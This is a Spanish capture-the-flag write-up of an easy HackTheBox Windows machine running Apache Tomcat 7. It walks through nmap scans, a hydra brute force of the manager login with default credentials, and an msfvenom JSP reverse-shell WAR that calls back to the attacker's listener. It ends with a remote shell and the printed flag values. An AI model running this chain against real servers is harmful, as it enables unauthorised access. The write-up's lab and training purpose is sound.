Propiedades:
- OS: Windows
- Plataforma: HackTheBox
- Nivel: Easy
- Tags: #tomcat #msfvenom #bruteforce 

![](assets/Pasted%20image%2020251210165646.png)
## Reconocimiento

Comienzo tirando un ping para comprobar conectividad:

```bash
> ping -c 1 10.129.3.112
PING 10.129.3.112 (10.129.3.112) 56(84) bytes of data.
64 bytes from 10.129.3.112: icmp_seq=1 ttl=127 time=112 ms

--- 10.129.3.112 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 112.022/112.022/112.022/0.000 ms
```

Realizo un escaneo con nmap para ver que puertos tenemos abiertos.

```bash
> sudo nmap -p- -sS -Pn -n --min-rate 5000 -vvv 10.129.3.112
---------------------------------------------------------------
Host is up, received user-set (0.11s latency).
Scanned at 2025-12-10 16:27:51 CST for 26s
Not shown: 65534 filtered tcp ports (no-response)
PORT     STATE SERVICE    REASON
8080/tcp open  http-proxy syn-ack ttl 127
```

- Puerto 8080 abierto

Sobre el puerto abierto realizo un escaneo mas profundo para detectar el servicio, version y correr un conjunto de scripts de reconocimiento.

```bash
> sudo nmap -p 8080 -sV -sC -Pn -n -sS --min-rate 5000 10.129.3.112 -oN target
-------------------------------------------------------------------------------
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/7.0.88
|_http-server-header: Apache-Coyote/1.1
```

- Puerto 8080 HTTP Apache Tomcat/Coyote JSP engine 
## Enumeración

**Puerto 8080**

- Apache Tomcat es un servidor de aplicaciones Java el cual nos permite desplegar y administrar aplicaciones.

![](assets/Pasted%20image%2020251210163030.png)

**manager/html.**

- Esta ruta es donde vamos a poder desplegar y administrar aplicaciones pero como vemos nos pide credenciales:

![](assets/Pasted%20image%2020251210163207.png)

## Explotación


Podemos bruteforcear el login usando `hydra` y un diccionario de credenciales default de `tomcat`.

```bash
> hydra -C /usr/share/wordlists/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http-get://10.129.3.112:8080/manager/html
-------------------------------------------------------------------------------------------------------------------------------------------------
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-12-10 16:38:42
[DATA] max 16 tasks per 1 server, overall 16 tasks, 76 login tries, ~5 tries per task
[DATA] attacking http-get://10.129.3.112:8080/manager/html
[8080][http-get] host: 10.129.3.112   login: admin   password: admin
[8080][http-get] host: 10.129.3.112   login: tomcat   password: s3cret
1 of 1 target successfully completed, 2 valid passwords found
```

- Vemos que tenemos las credenciales tomcat:s3cret

Antes de acceder al tomcat y subir nuestro payload primero tenemos que crearlo, vamos a usar `msfvenom` para crear un `WAR` malicioso

```bash
> msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.110 LPORT=443 -f war -o shell.war
Payload size: 1094 bytes
Final size of war file: 1094 bytes
Saved as: shell.war
```

Ahora vamos a desplegar el payload en el tomcat

![](assets/Pasted%20image%2020251210164847.png)

Una vez desplegada podemos ponernos en escucha.

```bash
> sudo nc -nlvp 443
Listening on 0.0.0.0 443
```

Y procedemos a darle clic a la ruta de la app:

![](assets/Pasted%20image%2020251210165221.png)

Recibimos la conexión:

```bash
Listening on 0.0.0.0 443
Connection received on 10.129.3.112 49193
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>dir
```

Y encontramos las flags en el directorio `Administrator/Desktop/flags`

```bash
C:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt"
type "2 for the price of 1.txt"
user.txt
7004dbcef0f854e0fb401875f26ebd00

root.txt
04a8b36e1545a455393d067e772fe90e
```

***PWND***

![](assets/Pasted%20image%2020251210165545.png)